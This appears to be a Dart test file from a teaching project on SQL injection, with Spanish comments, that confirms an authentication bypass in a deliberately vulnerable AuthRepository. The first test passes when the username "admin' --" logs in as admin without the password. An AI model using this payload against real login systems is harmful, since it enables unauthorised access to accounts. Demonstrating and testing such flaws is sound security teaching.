// Ataque automatizado contra la version VULNERABLE.
// El test PASA cuando la inyeccion tiene exito (confirma la vulnerabilidad).
import 'package:test/test.dart';
import 'package:a05_injection_vulnerable/auth_repository.dart';

void main() {
  final repo = AuthRepository();

  test('la inyeccion SQL permite el bypass de autenticacion', () {
    // Ataque: username = admin' --   password = cualquier cosa
    final r = repo.login("admin' --", "cualquier-cosa");
    expect(r.authenticated, isTrue,
        reason: 'la inyeccion deberia autenticar como admin sin el password');
    expect(r.username, 'admin');
  });

  test('un login invalido normal si falla', () {
    final r = repo.login('alice', 'password-incorrecto');
    expect(r.authenticated, isFalse);
  });
}
